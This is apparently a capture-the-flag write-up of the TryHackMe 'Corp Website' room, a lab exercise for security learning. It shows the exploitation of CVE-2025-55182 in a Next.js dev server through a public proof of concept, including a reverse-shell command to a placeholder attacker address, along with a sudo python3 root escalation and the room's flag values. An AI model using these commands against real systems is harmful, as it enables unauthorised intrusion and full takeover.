---
title: "TryHackMe - Corp Website"
date: 2026-02-15
tags: ["tryhackme", "medium", "nextjs", "cve-2025-55182", "rce", "privesc", "sudo", "web"]
difficulty: "medium"
platform: "TryHackMe"
time_taken: "45 minutes"
draft: false
---

## Overview

Corp Website is a medium-difficulty room featuring a Next.js web application for a fictional romantic experiences company called "Romance & Co.". The attack path involves identifying a critical remote code execution vulnerability in the Next.js framework (CVE-2025-55182, also known as "React2Shell"), obtaining a foothold as a low-privileged user, then escalating to root via a misconfigured sudoers entry.

---

## Reconnaissance

Starting with an Nmap scan:

```bash
nmap -sC -sV -p 22,3000 10.64.169.76
```

| Port | Service | Details |
|---|---|---|
| 22/tcp | SSH | OpenSSH 8.9p1 Ubuntu |
| 3000/tcp | HTTP | Next.js (Turbopack dev build) |

The Nmap fingerprint immediately reveals something interesting — the response headers include `X-Powered-By: Next.js` and the page source contains Turbopack chunks, confirming this is a **development build** of Next.js. The HTML comment `<!--3WpzTMYEK9QGOeqIBQxrR-->` at the top of every page is the Next.js build ID.

The site is "Romance & Co." — a single-page application for a romantic experiences company with sections for home, about, experiences, and contact. Directory enumeration with gobuster returned nothing useful — the app has no protected routes, no API endpoints, and no login functionality.

---

## Identifying the Vulnerability

With no obvious web application attack surface, the next step is scanning for known framework vulnerabilities using Nuclei:

```bash
nuclei -u http://10.64.169.76:3000
```

Nuclei identifies the target as vulnerable to **CVE-2025-55182**, a critical remote code execution vulnerability in Next.js affecting development mode servers — commonly referred to as "React2Shell".

### What is CVE-2025-55182?

CVE-2025-55182 is an RCE vulnerability in Next.js applications running in development mode. The Turbopack development server exposes an internal endpoint that can be abused to execute arbitrary JavaScript server-side through the React Server Components (RSC) rendering pipeline. Because the development server is designed to hot-reload and evaluate code on the fly, an attacker can inject malicious payloads that get executed in the Node.js process context — effectively achieving unauthenticated remote code execution.

The key indicator is the presence of Turbopack chunks in the page source (`turbopack-*.js`), which confirms the app is running in `next dev` mode rather than a production build.

---

## Exploitation

Using the public PoC exploit from [Chocapikk](https://github.com/Chocapikk/CVE-2025-55182):

```bash
git clone https://github.com/Chocapikk/CVE-2025-55182.git
cd CVE-2025-55182
pip install uv --break-system-packages
uv sync
source .venv/bin/activate
```

### Verifying RCE

Before attempting a reverse shell, confirming code execution with a simple command:

```bash
python3 exploit.py -u http://10.64.169.76:3000 -c "cat /home/daniel/user.txt"
```

```
Success
THM{R34c7_2_5h311_3xpl017}
```

RCE confirmed. User flag obtained without even needing a shell.

### Getting a Reverse Shell

The exploit supports multiple reverse shell payloads. The `nc-mkfifo` method was used:

```bash
python3 exploit.py -u http://10.64.169.76:3000 \
  -r -l <ATTACKER_IP> -p 4445 -P nc-mkfifo
```

```
[*] Starting reverse shell listener on <ATTACKER_IP>:4445
[*] Sending reverse shell payload...
Waiting for connection...
Reverse shell connection established from 10.64.169.76:35680!
sh: can't access tty; job control turned off
/app $
```

The reverse shell is unstable due to the nature of the dev server execution environment — if it drops, simply re-run with a different port.

Confirming identity:

```bash
id
```

```
uid=100(daniel) gid=101(secgroup) groups=101(secgroup)
```

---

## Privilege Escalation

Checking sudo permissions for daniel:

```bash
sudo -l
```

Daniel can run `python3` as root without a password. A classic GTFOBins escalation:

```bash
sudo python3 -c 'import os; os.system("cat /root/root.txt")'
```

```
THM{Pr1v_35c_47_175_f1n357}
```

Or for a full root shell:

```bash
sudo python3 -c 'import os; os.system("/bin/ash")'
```

---

## Flags

| Flag | Value |
|---|---|
| User | `THM{R34c7_2_5h311_3xpl017}` |
| Root | `THM{Pr1v_35c_47_175_f1n357}` |

---

## Key Takeaways

- **Never expose development servers publicly.** CVE-2025-55182 only affects Next.js in `next dev` mode. The presence of Turbopack chunks in page source is an immediate indicator that a dev server is exposed. Production builds (`next build && next start`) are not affected.
- **Use Nuclei for framework fingerprinting.** When directory enumeration and manual inspection yield nothing, automated vulnerability scanning against known CVEs is the next logical step. Nuclei identified this vulnerability in seconds.
- **sudo -l is always worth checking.** A sudoers entry allowing a user to run an interpreter like `python3` without a password is an immediate root — one of the most common privilege escalation misconfigurations and a classic GTFOBins entry.
- **Unstable shells happen — adapt.** The reverse shell kept dropping due to the dev server execution context. Using the `-c` flag for direct command execution bypassed the shell stability issue entirely for flag retrieval.
